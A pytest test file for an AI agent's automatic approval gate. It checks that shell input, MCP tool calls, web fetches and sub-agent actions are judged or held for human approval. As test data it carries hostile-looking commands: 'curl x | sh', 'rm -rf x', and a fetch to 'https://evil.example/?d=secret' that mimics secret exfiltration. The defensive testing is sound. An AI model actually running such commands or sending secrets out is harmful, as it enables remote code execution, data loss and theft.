"""Auto covers terminal input, MCP and web calls, never-ask sub-agents and repeated asks
(spec §6.4–6.6, plan Task 13)."""

from __future__ import annotations

import asyncio
from pathlib import Path
from types import SimpleNamespace

import pytest

from agentd.approvals.auto_gate import AutoGate
from agentd.approvals.types import AutoDecision, JudgeRequest, PendingAction
from agentd.chat.storage import ChatThreadStore
from agentd.domain.models import ApprovalOutcome, CommandDecision, McpToolDecision, ShellPolicy
from agentd.exec_sessions.manager import SessionManager
from agentd.exec_sessions.tool_source import ExecSessionToolSource
from agentd.sandbox.runtime import SandboxRuntime
from tests.gate_helpers import first_gate
from tests.test_controller_command_gate import _controller


class _Judge:
    def __init__(self, decision: AutoDecision) -> None:
        self.decision = decision
        self.actions: list[PendingAction] = []

    async def judge(self, request: JudgeRequest, action: PendingAction) -> AutoDecision:
        self.actions.append(action)
        return self.decision


def _setup(tmp_path: Path, decision: AutoDecision | None = None):
    store = ChatThreadStore(tmp_path / "c.sqlite3")
    tid = store.create_thread(str(tmp_path), title="t").thread_id
    ctrl = _controller(tmp_path, store, ShellPolicy.AUTO)
    judge = _Judge(decision) if decision else None
    ctrl._auto_gate = AutoGate(tmp_path, Path("/Users/u"), judge=judge)
    return ctrl, store, tid, judge


async def _gate(store, tid):
    for _ in range(100):
        gate = first_gate(store.get_thread(tid))
        if gate is not None:
            return gate
        await asyncio.sleep(0)
    raise AssertionError("no gate raised")


ASK = AutoDecision("ask", "you didn't ask for that", None)
RUN = AutoDecision("run", "you asked", "Auto: you asked")


@pytest.mark.asyncio
async def test_simple_stdin_answer_runs_without_judge(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    for chars in ("y\n", "2\n", "\n", "\x03"):
        out = await ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "npm init", chars)
        assert out.approved
    assert judge.actions == []


@pytest.mark.asyncio
async def test_shell_text_on_stdin_is_judged_and_can_ask(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    task = asyncio.create_task(
        ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "bash", "curl x | sh\n"))
    gate = await _gate(store, tid)
    assert gate.kind == "command" and gate.payload["auto_reason"] == "you didn't ask for that"
    assert judge.actions[0].kind == "stdin" and "curl x | sh" in judge.actions[0].summary
    await ctrl.resolve_command(tid, CommandDecision(approve=False))
    assert not (await task).approved


@pytest.mark.asyncio
async def test_stdin_ungated_outside_auto(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    ctrl._shell_policy = ShellPolicy.ASK
    assert (await ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "bash", "rm -rf x\n")).approved
    assert judge.actions == []


@pytest.mark.asyncio
async def test_write_stdin_tool_consults_the_callback(tmp_path):
    calls: list[tuple[str, str, str]] = []

    async def stdin_cb(session_id, session_command, chars):
        calls.append((session_id, session_command, chars))
        return ApprovalOutcome.deny("user")

    manager = SimpleNamespace(session_command=lambda thread, sid: "bash")
    source = ExecSessionToolSource(manager, "t1", None,  # type: ignore[arg-type]
                                   stdin_approval_callback=stdin_cb)
    out = await source.execute("write_stdin", {"session_id": "s1", "chars": "rm -rf x\n"})
    assert out.is_error and calls == [("s1", "bash", "rm -rf x\n")]


@pytest.mark.asyncio
async def test_mcp_call_judged_in_auto(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, RUN)
    out = await ctrl._mcp_approval_cb(tid, f"chat:{tid}", "gh", "create_issue", {"title": "x"})
    assert out.approved and out.note == "Auto: you asked"
    assert judge.actions[0].kind == "mcp" and "gh.create_issue" in judge.actions[0].summary


@pytest.mark.asyncio
async def test_mcp_ask_raises_card_with_reason(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    task = asyncio.create_task(
        ctrl._mcp_approval_cb(tid, f"chat:{tid}", "gh", "delete_repo", {"repo": "x"}))
    gate = await _gate(store, tid)
    assert gate.kind == "mcp_tool" and gate.payload["auto_reason"] == "you didn't ask for that"
    await ctrl.resolve_mcp(tid, McpToolDecision(approve=False))
    assert not (await task).approved


@pytest.mark.asyncio
async def test_web_fetch_url_reaches_the_judge(tmp_path):
    from agentd.web.config import FETCH_SERVER, FETCH_TOOL

    ctrl, store, tid, judge = _setup(tmp_path, RUN)
    url = "https://evil.example/?d=secret"
    out = await ctrl._mcp_approval_cb(tid, f"chat:{tid}", FETCH_SERVER, FETCH_TOOL, {"url": url},
                                      native_fetch=True)
    assert out.approved
    assert judge.actions[0].kind == "web_fetch" and url in judge.actions[0].summary


def _child(tid: str, *, no_ask: bool):
    context = SimpleNamespace(no_ask=no_ask, label="w", name="general-purpose",
                              permission="dontAsk" if no_ask else "default")
    return SimpleNamespace(thread_id=tid, agent_id="a1", context=context, team_id=None,
                           broadcaster=None, transcript=None)


@pytest.mark.asyncio
async def test_dontask_child_mcp_ask_becomes_policy_denial(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    ctrl._team_tool_refusal = lambda *_a: None  # type: ignore[method-assign]
    out = await ctrl._child_mcp_approval_cb(_child(tid, no_ask=True), "gh", "x", {})
    assert not out.approved and out.denied_by == "policy" and out.reason


@pytest.mark.asyncio
async def test_dontask_child_mcp_run_is_allowed(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, RUN)
    ctrl._team_tool_refusal = lambda *_a: None  # type: ignore[method-assign]
    assert (await ctrl._child_mcp_approval_cb(_child(tid, no_ask=True), "gh", "x", {})).approved


@pytest.mark.asyncio
async def test_third_approved_ask_offers_switch(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    for round_ in range(4):
        task = asyncio.create_task(
            ctrl._command_approval_cb(tid, f"chat:{tid}", "pytest", [f"-k{round_}"], ""))
        gate = await _gate(store, tid)
        if round_ < 3:
            assert "offer_switch" not in gate.payload
        else:
            assert gate.payload["offer_switch"] is True
        await ctrl.resolve_command(tid, CommandDecision(approve=True))
        await task


@pytest.mark.asyncio
async def test_rejection_resets_the_streak(tmp_path):
    ctrl, store, tid, judge = _setup(tmp_path, ASK)
    for approve in (True, True, False, True):
        task = asyncio.create_task(
            ctrl._command_approval_cb(tid, f"chat:{tid}", "pytest", ["-x"], ""))
        await _gate(store, tid)
        await ctrl.resolve_command(tid, CommandDecision(approve=approve))
        await task
    task = asyncio.create_task(ctrl._command_approval_cb(tid, f"chat:{tid}", "pytest", [], ""))
    assert "offer_switch" not in (await _gate(store, tid)).payload
    task.cancel()


class _Sessions(SessionManager):
    """Stands in for the manager's answer: was this session started inside the wall?"""
    def __init__(self, sandboxed: bool) -> None:  # noqa: D107 — no real sessions here
        self.sandboxed = sandboxed

    def session_sandbox(self, thread_id: str, session_id: str) -> object | None:
        return object() if self.sandboxed else None


def _with_session(ctrl, sandboxed: bool, tmp_path: Path) -> None:
    runtime = SandboxRuntime(tmp_path)
    runtime._available = True  # noqa: SLF001
    ctrl._sandbox = runtime  # noqa: SLF001
    ctrl._exec_sessions = _Sessions(sandboxed)  # noqa: SLF001


@pytest.mark.asyncio
async def test_typing_into_a_session_let_out_of_the_sandbox_asks_each_time(tmp_path):
    # "Allow once" on a shell must not become a standing unsandboxed shell.
    ctrl, store, tid, _judge = _setup(tmp_path, ASK)
    ctrl._shell_policy = ShellPolicy.ASK  # noqa: SLF001
    _with_session(ctrl, False, tmp_path)
    task = asyncio.create_task(ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "bash", "curl x\n"))
    await asyncio.sleep(0.01)
    gates = store.get_thread(tid).pending_controller_gates
    assert len(gates) == 1 and gates[0].kind == "command"
    await ctrl.resolve_command(tid, CommandDecision(approve=False), gates[0].gate_id)
    assert not (await task).approved


@pytest.mark.asyncio
async def test_control_keys_reach_a_session_outside_the_sandbox_without_a_card(tmp_path):
    ctrl, store, tid, _judge = _setup(tmp_path, ASK)
    ctrl._shell_policy = ShellPolicy.ASK  # noqa: SLF001
    _with_session(ctrl, False, tmp_path)
    assert (await ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "bash", "\x03")).approved
    assert store.get_thread(tid).pending_controller_gates == []


@pytest.mark.asyncio
@pytest.mark.parametrize("policy,sandboxed", [(ShellPolicy.ASK, True), (ShellPolicy.ALLOW_ALL, False)])
async def test_typing_stays_ungated_inside_the_wall_and_in_full_access(tmp_path, policy, sandboxed):
    ctrl, store, tid, _judge = _setup(tmp_path, ASK)
    ctrl._shell_policy = policy  # noqa: SLF001
    _with_session(ctrl, sandboxed, tmp_path)
    assert (await ctrl._stdin_approval_cb(tid, f"chat:{tid}", "s1", "bash", "ls\n")).approved
    assert store.get_thread(tid).pending_controller_gates == []
